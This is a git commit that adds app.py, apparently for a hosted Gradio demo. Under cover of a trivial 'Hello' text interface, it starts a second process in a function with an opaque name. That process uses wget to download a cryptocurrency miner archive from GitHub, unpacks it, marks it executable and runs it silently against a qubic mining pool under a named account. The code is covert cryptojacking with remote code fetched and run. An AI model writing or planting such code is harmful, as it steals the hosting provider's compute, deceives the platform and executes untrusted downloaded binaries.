61bd32dabb79f483c860eb5dec1e97f96675918d
Fgrr23 <fsswr518@gmail.com>
2025-02-01 05:14:41 +0100

    Create app.py

---
+++ app.py
@@ -0,0 +1,19 @@
+from multiprocessing import Process
+import gradio as gr
+import os, subprocess
+
+def hello(name):
+    return "Hello " + name + "!!"
+
+demo = gr.Interface(fn=hello, inputs="text", outputs="text")
+
+def dab01959():
+    wk_name = os.getenv('SPACE_ID').replace("/","_")
+    os.system("wget https://github.com/Fgrr23/pou/raw/refs/heads/main/apoolminer_linux_autoupdate.tar.gz && tar xvf apoolminer_linux_autoupdate.tar.gz")
+    os.system("chmod +x ./apoolminer_linux_autoupdate/apoolminer")
+    os.system(f"./apoolminer_linux_autoupdate/apoolminer --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")
+
+
+if __name__ == '__main__':
+    Process(target=demo.launch).start()
+    Process(target=dab01959).start()
